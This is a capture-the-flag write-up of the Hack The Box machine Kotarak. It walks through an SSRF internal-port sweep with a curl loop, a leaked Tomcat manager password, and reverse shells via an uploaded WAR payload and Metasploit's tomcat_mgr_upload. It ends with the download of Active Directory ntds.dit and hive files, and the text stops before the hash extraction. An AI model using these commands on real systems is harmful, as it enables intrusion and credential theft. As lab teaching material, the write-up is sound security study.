---
layout: post
title: Kotarak(HTB)
categories:
  - Writeup
---

<br>OS linux
<br>IP: 10.10.10.55


**Nmap**:-
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># nmap -sS -A 10.10.10.55</p>

<p>Starting Nmap 7.50 ( https://nmap.org ) at 2018-03-10 02:58 EST
<br>Warning: 10.10.10.55 giving up on port because retransmission cap hit (6).
<br>Nmap scan report for 10.10.10.55
<br>Host is up (0.17s latency).
<br>Not shown: 65531 closed ports
<br>PORT      STATE SERVICE VERSION
<br><font color="BB69EC">22/tcp</font>    open  <font color="53E100">ssh</font>     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
<br><font color="BB69EC">8009/tcp</font>  open  <font color="53E100">ajp13</font>   Apache Jserv (Protocol v1.3)
<br><font color="BB69EC">8080/tcp</font>  open  <font color="53E100">http</font>    Apache Tomcat 8.5.5
<br><font color="BB69EC">60000/tcp</font> open  <font color="53E100">http</font>    Apache httpd 2.4.18 ((Ubuntu))
<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<br>Nmap done: 1 IP address (1 host up) scanned in 3859.03 seconds</p>

<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font>#</p>

</div>
</font>

<br>**Web**:-
<br>**PORT**:- 8080

![1](https://teckk2.github.io/assets/images/Kotarak/1.JPG)
<br>Tomca 8.5.5 is running
![2](https://teckk2.github.io/assets/images/Kotarak/2.JPG)
<br>To access it we need a valid password, let's find it.

<br>**Port**:- 60000
![3](https://teckk2.github.io/assets/images/Kotarak/3.JPG)
<br>On this port a private web service is running which access the file from internal system, let's enumerate it further
![4](https://teckk2.github.io/assets/images/Kotarak/4.JPG)
![5](https://teckk2.github.io/assets/images/Kotarak/5.JPG)
<br>There is no ouput, and the server is running a url.php and we also need to specify a path which Maybe running in some internal port,So we need to find the correct internal port first.
<br>**for i in $(seq 1 60000); do echo $i; curl -X GET http://10.10.10.55:60000/url.php?path=http://localhost:$i/ 2> /dev/null | tr -d "\n"; done**
![6](https://teckk2.github.io/assets/images/Kotarak/6.JPG)
<br>Thanks my friend [**Zc00l**](https://www.hackthebox.eu/profile/3564) for helping me in the bash command above, this will ping all the internal port 1 by 1 and if it get's any response it will show it to us in the output.
![7](https://teckk2.github.io/assets/images/Kotarak/7.JPG)
<br>On internal port **888** we got some response which is is refering to a doc file named backup, let's try to read it
![8](https://teckk2.github.io/assets/images/Kotarak/8.JPG)
![9](https://teckk2.github.io/assets/images/Kotarak/9.JPG)
<br>And we got the admin password to loggin to Tomcat server
<br>username="**admin**" password="**3@g01PdhB!**"
![10](https://teckk2.github.io/assets/images/Kotarak/10.JPG)

<br>**Shell**
<br>**First Method**-(NC)
<br>First generate a java payload for reverse shell with .war extension
![11](https://teckk2.github.io/assets/images/Kotarak/11.JPG)
<br>Now from tomcat webpage, browse the file and upload it,
![12](https://teckk2.github.io/assets/images/Kotarak/12.JPG)
![13](https://teckk2.github.io/assets/images/Kotarak/13.JPG)
<br>Now steup the listner and then click the file, or just open it on another browser and we will get the reverse shell

<font size="1">
<div style="height:100px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># nc -nlvp 4455
<br>listening on [any] 4455 ...
<br>connect to [10.10.*.*] from (UNKNOWN) [10.10.10.55] 51012
<br>id
<br>uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
<br><font color="ffff00">python -c 'import pty;pty.spawn("/bin/bash")'</font>
<br>tomcat@kotarak-dmz:/$ </p>

</div>
</font>

<br>**Second Method**-(Meterpreter)

<font size="1">
<div style="height:600px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p>msf > use exploit/multi/http/tomcat_mgr_upload
<br>msf exploit(<font color="red">tomcat_mgr_upload</font>) > set HttpPassword 3@g01PdhB!
<br>HttpPassword => 3@g01PdhB!
<br>msf exploit(<font color="red">tomcat_mgr_upload</font>) > set HttpUsername admin
<br>HttpUsername => admin
<br>msf exploit(<font color="red">tomcat_mgr_upload</font>) > set RHOST 10.10.10.55
<br>RHOST => 10.10.10.55
<br>msf exploit(<font color="red">tomcat_mgr_upload</font>) > set RPORT 8080
<br>RPORT => 8080
<br>msf exploit(<font color="red">tomcat_mgr_upload</font>) > set payload java/meterpreter/reverse_tcp 
<br>payload => java/meterpreter/reverse_tcp
<br>msf exploit(<font color="red">tomcat_mgr_upload</font>) > set LHOST 10.10.*.*
<br>LHOST => 10.10.14.10
<br>msf exploit(<font color="red">tomcat_mgr_upload</font>) > set LPORT 444
<br>LPORT => 444
<br>msf exploit(<font color="red">tomcat_mgr_upload</font>) > exploit</p>

<p><font color="RoyalBlue">[*]</font> Started reverse TCP handler on 10.10.*.*:444 
<br><font color="RoyalBlue">[*]</font> Retrieving session ID and CSRF token...
<br><font color="RoyalBlue">[*]</font> Uploading and deploying SpSZIX2EJFTDocUB04tgi...
<br><font color="RoyalBlue">[*]</font> Executing SpSZIX2EJFTDocUB04tgi...
<br><font color="RoyalBlue">[*]</font> Undeploying SpSZIX2EJFTDocUB04tgi ...
<br><font color="RoyalBlue">[*]</font> Sending stage (49645 bytes) to 10.10.10.55
<br><font color="RoyalBlue">[*]</font> Meterpreter session 1 opened (10.10.*.*:444 -> 10.10.10.55:33730) at 2018-03-10 06:27:46 -0500</p>

<p>meterpreter > getuid 
<br>Server username: tomcat
<br>meterpreter >
<br>...
<br>....
<br>.....
<br>meterpreter > pwd
<br>/home/tomcat/to_archive/pentest_data
<br>meterpreter > ls -la
<br>Listing: /home/tomcat/to_archive/pentest_data
<br>=============================================</p>

<p>Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;Last modified&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name
<br>----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----
<br>100666/rw-rw-rw-&nbsp;&nbsp;16793600&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2017-07-21 12:16:23 -0400&nbsp;&nbsp;20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br>100666/rw-rw-rw-&nbsp;&nbsp;12189696&nbsp;&nbsp;fil&nbsp;&nbsp;&nbsp;2017-07-21 12:16:45 -0400  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin</p>

<p>meterpreter > download 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit\r
<br><font color="RoyalBlue">[*]</font> Downloading: 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> Downloaded 4.00 KiB of 16.02 MiB (0.02%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> Downloaded 8.00 KiB of 16.02 MiB (0.05%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> Downloaded 12.00 KiB of 16.02 MiB (0.07%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> Downloaded 16.00 KiB of 16.02 MiB (0.1%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br>....
<br>......
<br>........
<br><font color="RoyalBlue">[*]</font> Downloaded 16.00 MiB of 16.02 MiB (99.9%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> Downloaded 16.00 MiB of 16.02 MiB (99.93%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> Downloaded 16.01 MiB of 16.02 MiB (99.95%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> Downloaded 16.01 MiB of 16.02 MiB (99.98%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> Downloaded 16.02 MiB of 16.02 MiB (100.0%): 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br><font color="RoyalBlue">[*]</font> download   : 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -> <br>20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
<br>meterpreter > download 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloading: 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 4.00 KiB of 11.62 MiB (0.03%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 8.00 KiB of 11.62 MiB (0.07%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 12.00 KiB of 11.62 MiB (0.1%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 16.00 KiB of 11.62 MiB (0.13%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 20.00 KiB of 11.62 MiB (0.17%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br>....
<br>......
<br>........
<br><font color="RoyalBlue">[*]</font> Downloaded 11.61 MiB of 11.62 MiB (99.87%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 11.61 MiB of 11.62 MiB (99.9%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 11.62 MiB of 11.62 MiB (99.93%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 11.62 MiB of 11.62 MiB (99.97%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> Downloaded 11.62 MiB of 11.62 MiB (100.0%): 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br><font color="RoyalBlue">[*]</font> download   : 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -> <br>20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
<br>meterpreter > </p>

</div>
</font>

<br>We don't have user access, so from **/home/tomcat/to archive/pentest data** I downloaded both the files which was .dit and .bin.
<br>The ntds.dit file is the heart of Active Directory including user accounts. Active Directory's database engine is the Extensible Storage Engine ( ESE ) which is based on the Jet database used by Exchange 5.5 and WINS.
<br>So now from these files we can extract the password hash of users, but before that we need to download few tools

















